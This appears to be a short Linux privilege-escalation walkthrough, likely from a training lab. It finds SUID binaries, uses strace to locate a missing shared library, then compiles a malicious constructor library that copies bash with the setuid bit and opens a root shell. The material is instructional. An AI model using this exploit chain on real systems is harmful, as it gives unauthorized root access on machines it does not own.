#### Identifying SUID Binaries
**Victim's Machine**
```
find / -type f -perm 4000 -ls 2>/dev/null
```
Non-standard binaries located in unusual directories `/usr/local/bin` or `/home`, which might be vulnerable.

#### Analyze the SUID Binary for Vulnerabilities
```
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

	`strace`: This tool is used to trace system calls made by a program and the signals it receive.

#### Exploitation
**Attacker's Machine**
```
mkdir /home/user/.config
cd /home/user/.config
```

**Open a text editor and type:**
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

The code attempts to ***use a constructor function to exploit a vulnerability by injecting a malicious action*** when the program is executed.

**Compile the code**
```
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

- `-o /home/user/.config/libcalc.so`: Output file
- `-shared`: Tells the compiler to create a shared library (.so file).
- `-fPIC`: Position Independent Code, which is necessary for creating shared libraries to load at memory addresses.
- `/home/user/.config/libcalc.c`: Input file

**Run the `suid-so` binary**:
```
/usr/local/bin/suid-so
id
```


